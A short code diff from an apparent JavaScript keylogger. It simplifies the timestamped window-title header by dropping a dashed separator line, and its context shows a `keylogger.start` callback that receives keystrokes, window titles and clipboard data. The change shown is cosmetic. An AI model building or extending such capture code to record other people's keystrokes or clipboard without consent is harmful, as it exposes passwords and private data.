@@ -46,14 +46,12 @@ function cleanWindowTitle(title) {
     
     return title.trim();
 }
-
 // Function to format window header
 function formatWindowHeader(windowTitle) {
     const now = new Date();
     const time = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
     const cleanTitle = cleanWindowTitle(windowTitle);
-    const separator = '-'.repeat(80);
-    return `${separator}\n[${time} - ${cleanTitle}]\n${separator}`;
+    return `[${time} - ${cleanTitle}]`;
 }
 
 keylogger.start((key, isKeyUp, keyCode, windowTitle, clipboardData) => {
